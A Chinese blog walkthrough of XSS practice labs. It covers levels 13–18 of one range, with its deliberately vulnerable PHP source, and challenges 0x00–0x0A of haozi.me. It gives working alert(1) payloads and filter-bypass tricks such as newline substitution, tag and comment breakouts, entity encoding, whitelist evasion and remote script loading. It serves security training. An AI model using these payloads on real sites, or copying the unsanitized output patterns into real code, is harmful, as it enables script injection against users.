<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204140248710.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204140248710.png" alt="image-20240204140248710"></a></p>
<p><strong>答案：<code>Cookie: user=&quot; onclick=&quot;alert(1)&quot; type=&quot;true</code></strong></p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level14.php&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level13&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str00</span> = <span class="variable">$_GET</span>[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line"><span class="variable">$str11</span>=<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="variable">$str22</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str11</span>);</span><br><span class="line"><span class="variable">$str33</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str22</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str00</span>).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="variable">$str33</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 14</p>
<p>本题环境出现问题，略（Windows服务器下无法复现）</p>
</li>
<li>
<p>Level 15</p>
<p>本题考查ng-include函数的使用</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204140554202.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204140554202.png" alt="image-20240204140554202"></a></p>
<p><strong>答案：<code>src='level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;'</code></strong></p>
<ul>
<li>
<p><code>ng-include</code>是AngularJS框架中的一个指令（directive）。</p>
<p><code>ng-include</code>用于在AngularJS应用中包含外部的HTML文件或其他AngularJS模板。<strong>引入AngularJS库：</strong> 确保在你的HTML文件中引入了AngularJS库。</p>
<ol>
<li>
<pre><code class="language-html">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.8.0/angular.min.js&quot;&gt;&lt;/script&gt;
XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用。   ```html   &lt;div ng-app=&quot;myApp&quot;&gt;       &lt;!-- 应用内容将在这里 --&gt;   &lt;/div&gt;
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. **使用`ng-include`指令：** 在需要包含外部内容的地方使用`ng-include`指令，并指定要包含的文件路径。</span><br><span class="line"></span><br><span class="line">   ```html</span><br><span class="line">   &lt;div ng-include=&quot;&#x27;path/to/your/template.html&#x27;&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

注意：单引号内的路径可以是相对路径或绝对路径。

</code></pre>
</li>
<li>
<p><strong>定义AngularJS模块和控制器：</strong> 在JavaScript中定义AngularJS模块和控制器，并将其与应用相关联。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> app = angular.<span class="title function_">module</span>(<span class="string">&#x27;myApp&#x27;</span>, []);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    app.<span class="title function_">controller</span>(<span class="string">&#x27;myController&#x27;</span>, <span class="keyword">function</span>(<span class="params">$scope</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 控制器逻辑</span></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p><strong>关联控制器和<code>ng-include</code>：</strong> 在包含<code>ng-include</code>的元素中使用<code>ng-controller</code>来关联控制器。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-controller</span>=<span class="string">&quot;myController&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-include</span>=<span class="string">&quot;&#x27;path/to/your/template.html&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>这样，<code>ng-include</code>指令就会加载指定的HTML文件或AngularJS模板，并将其内容包含在应用中。这是一种实现模块化和代码重用的方式，特别适用于大型AngularJS应用。</p>
</li>
</ul>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level16.php?keyword=test&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第<span class="number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 16</p>
<p>本题在<center>标签内，根据后面的<img>标签提示，我们可以构造一个img标签</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204141319824.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204141319824.png" alt="image-20240204141319824"></a></p>
<p>经过尝试发现过滤了空格，我们可以用<code>%0A</code>换行符绕过空格</p>
<p><strong>答案：<code>keyword=&lt;img%0Asrc=1%0Aonclick=&quot;alert(1)&quot;&gt;</code></strong></p>
<p>答案实际形式：</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyword=&lt;img</span><br><span class="line">src=1</span><br><span class="line">onclick=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>源代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="comment">&lt;!--STATUS OK--&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;content-type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="language-javascript">&#123;     </span></span><br><span class="line"><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>欢迎来到level16<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>欢迎来到level16<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class="line"><span class="meta">$str = strtolower($_GET[&quot;keyword&quot;]);</span></span><br><span class="line"><span class="meta">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span></span><br><span class="line"><span class="meta">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span></span><br><span class="line"><span class="meta">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span></span><br><span class="line"><span class="meta">$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);</span></span><br><span class="line"><span class="meta">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">level16.png</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php </span></span><br><span class="line"><span class="meta">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Level 17</p>
<p>查看网页源代码可知有两个参数arg01和arg02，进行尝试后发现会拼接在<embed>标签内，有src属性</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204142001519.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204142001519.png" alt="image-20240204142001519"></a></p>
<p>可以构造以下payload</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204142237099.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204142237099.png" alt="image-20240204142237099"></a></p>
<p><strong>答案：<code>arg01=a&amp;arg02= onMouseOver=alert(1)</code></strong></p>
</li>
<li>
<p>Level 18</p>
<p>本题与17题一致，payload相同</p>
</li>
</ul>
<h3 id="haozi-xss题解">haozi.xss题解</h3>
<p>网址： <a target="_blank" rel="noopener" href="https://xss.haozi.me/">https://xss.haozi.me/</a></p>
<ul>
<li>
<h4 id="0x00">0x00</h4>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204143959934.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204143959934.png" alt="image-20240204143959934"></a></p>
</li>
</ul>
<p><strong>答案：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></strong></p>
<ul>
<li>
<h4 id="0x01">0x01</h4>
<p>注入点在&lt;textarea&gt;&lt;/textarea&gt;标签中，故按照0x00的方法无法被解析，可提前闭合标签。</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204144343303.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204144343303.png" alt="image-20240204144343303"></a></p>
<p><strong>答案：<code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></strong></p>
<p>也可以利用error事件：<code>&lt;/textarea&gt;&lt;img src=&quot;&quot; onerror=alert(1)&gt;</code>，由于src是空，所以肯定会报错,，故通过错误调用事件成功注入</p>
</li>
<li>
<h4 id="0x02">0x02</h4>
<p>本题input标签内的value会将值转化为字符串，然后显示在输入框内，故前两题的标签闭合注入会失效，可以借鉴SQL注入的方法，将前面的双引号闭合，然后注入新的标签</p>
<p>答案：<code>&quot; &gt; &lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p>也可以使用onclick事件：</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204144832842.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204144832842.png" alt="image-20240204144832842"></a></p>
<p><strong>答案：<code>&quot; onclick=&quot;alert(1)</code></strong></p>
</li>
<li>
<h4 id="0x03">0x03</h4>
<p>过滤符号：<code>() &lt;&gt;</code> ，在JavaScript中可以使用反引号`` <code>来代替</code>()`</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204150455947.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204150455947.png" alt="image-20240204150455947"></a></p>
<p><strong>答案：<code>&lt;script&gt;alert</code>1<code>&lt;/script&gt;</code></strong></p>
<p>或：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert</span>`<span class="attr">1</span>\`&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<h4 id="0x04">0x04</h4>
<p>过滤符号：小括号()，中括号[]，反引号` 可使用HTML实体编码绕过</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204151017389.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204151017389.png" alt="image-20240204151017389"></a></p>
<p><strong>答案：</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert&amp;#40;1&amp;#41;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<h4 id="0x05">0x05</h4>
<p>HTML的注释有两种方式：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 注释内容 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 注释内容 --!&gt;</span></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204151215313.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204151215313.png" alt="image-20240204151215313"></a></p>
<p><strong>答案：<code>--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></strong></p>
</li>
<li>
<h4 id="0x06">0x06</h4>
<p>正则表达式匹配了：<strong>auto</strong> 、<strong>以on开头且以=结尾的字符串</strong>、 <strong>&gt;</strong></p>
<p>所以过滤了autofocus和onerror等事件，以及防止input标签被闭合。</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204152604165.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204152604165.png" alt="image-20240204152604165"></a></p>
<p>可以通过换行<code>%0A</code>来绕过匹配，<strong>答案：</strong></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type=&quot;image&quot; src=&quot;&quot; onerror</span><br><span class="line">=alert(1)</span><br><span class="line"></span><br><span class="line">onclick</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure>
</li>
<li>
<h4 id="0x07">0x07</h4>
<p>本题主要利用html部分单标签可以解析，例如img标签</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204153048091.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204153048091.png" alt="image-20240204153048091"></a></p>
<p><strong>答案：<code>&lt;img src=&quot;&quot; onerror=alert(1)</code></strong></p>
</li>
<li>
<h4 id="0x08">0x08</h4>
<p>使用正则过滤</style>,可以多加一个空格或使用换行符造成正则逃逸。</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204153220204.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204153220204.png" alt="image-20240204153220204"></a></p>
<p><strong>答案：<code>&lt;/style &gt;&lt;img src=1 onerror=&quot;alert(1)&quot;</code></strong></p>
</li>
<li>
<h4 id="0x09">0x09</h4>
<p>本题使用正则表达式白名单匹配固定网址，可在正确的网址后多加字符，再把前面的双引号闭合，再输入onerror错误事件</p>
<p><a target="_blank" rel="noopener" href="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204153430571.png"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/image-20240204153430571.png" alt="image-20240204153430571"></a></p>
<p><strong>答案：<code>https://www.segmentfault.com&quot; onerror=&quot;alert(1)</code></strong></p>
</li>
<li>
<h4 id="0x0A">0x0A</h4>
<p>本题通过html转义, 过滤了所有可注入的关键字，经研究（看答案）可知，可直接引用指定网站下的目录文件来达到xss注入的目的，如在靶场的目录下有个j.js文件, 内有alert(1);代码, 直接调用即可注入，<strong>答案：<code>https://www.segmentfault.com.haozi.me/j.js</code></strong></p>
<p>也可用url的@语法来进行跳转调用，例如<code>https://www.baidu.com@www.bing.com</code> ，最终会跳转到bing上，根据此原理可以在其他服务器上事先写好alert(1);并跳转执行。</p>
</li>
<li>
<h4 id="0x0B">0x0B</h4>
</li>
<li>
<h4 id="0x0C">0x0C</h4>
</li>
<li>
<h4 id="0x0D">0x0D</h4>
</li>
<li>
<h4 id="0x0E">0x0E</h4>
</li>
<li>
<h4 id="0x0F">0x0F</h4>
</li>
<li>
<h4 id="0x10">0x10</h4>
</li>
<li>
<h4 id="0x11">0x11</h4>
</li>
<li>
<h4 id="0x12">0x12</h4>
</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://c3ngh.top">C3ngH</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://c3ngh.top/XSSWriteUp/">http://c3ngh.top/XSSWriteUp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://c3ngh.top" target="_blank">C3ngH's B10g</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post_share"><div class="social-share" data-image="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/FileInclude/" title="文件包含"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">文件包含</div></div></a></div><div class="next-post pull-right"><a href="/CrossSiteScripting/" title="XSS注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XSS注入</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/CrossSiteScripting/" title="XSS注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-02</div><div class="title">XSS注入</div></div></a></div><div><a href="/FileInclude/" title="文件包含"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-14</div><div class="title">文件包含</div></div></a></div><div><a href="/FileUpload/" title="文件上传"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-14</div><div class="title">文件上传</div></div></a></div><div><a href="/PHPunserialize/" title="PHP反序列化"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-18</div><div class="title">PHP反序列化</div></div></a></div><div><a href="/RCE/" title="RCE（重构版）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-25</div><div class="title">RCE（重构版）</div></div></a></div><div><a href="/SQLinjection/" title="SQL注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-29</div><div class="title">SQL注入</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://c3ngh-blog.oss-cn-hangzhou.aliyuncs.com/img/C3ngH.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C3ngH</div><div class="author-info__description">允许一切如其所是</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zch050217"><i class="fab fa-github"></i><span>关注作者</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/zch050217" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:zch050217@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div 